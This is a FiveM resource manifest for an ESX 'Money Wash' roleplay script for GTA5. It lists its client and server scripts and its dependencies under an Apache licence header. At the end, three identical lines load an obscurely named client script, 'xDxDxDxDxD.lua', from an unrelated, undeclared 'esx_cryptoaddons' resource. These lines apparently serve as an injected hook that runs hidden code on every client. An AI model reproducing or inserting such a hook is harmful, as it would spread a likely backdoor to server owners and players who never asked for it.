--[[ 
	Kronenburg Roleplay
	Copyright © GJSBRT <g@gijs.eu>

	This project is licensed under the terms of the Apache License 2.0 license.
	https://choosealicense.com/licenses/apache-2.0/
]]
 
 
fx_version 'adamant'
games { 'gta5' }

description 'ESX Money Wash'
version '0.1.2'

client_scripts {

	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua',

}

server_scripts {

	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua',
	'version.lua'

}

dependencies {

    'es_extended',

}



client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'